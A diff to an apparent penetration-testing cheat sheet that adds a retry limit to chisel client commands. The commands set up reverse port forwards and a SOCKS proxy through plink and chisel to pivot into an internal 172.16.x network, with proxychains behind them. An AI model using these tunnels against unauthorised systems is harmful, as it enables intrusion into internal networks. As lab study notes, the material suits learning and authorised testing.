@@ -1716,15 +1716,15 @@ C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:983
 https://github.com/jpillora/chisel/releases
 ```bash
 ./chisel_1.9.0_linux_amd64 server -p 2345 --reverse
-.\chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445
+.\chisel.exe client --max-retry-count 2 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445
 
 # Dynamic
 ./chisel_1.9.0_linux_amd64 server -p 2345 --socks5 --reverse
-./chisel_1.9.0_linux_amd64 client 192.168.49.100:2345 R:socks
+./chisel_1.9.0_linux_amd64 client --max-retry-count 2 192.168.49.100:2345 R:socks
 
 #Listening fowarding
 ./chisel_1.9.0_linux_amd64 server -p 2345 
-.\chisel.exe client 192.168.45.184:2345 1337:127.0.0.1:80
+.\chisel.exe client --max-retry-count 2 192.168.45.184:2345 1337:127.0.0.1:80
 
 # tail /etc/proxychains4.conf
 [ProxyList]
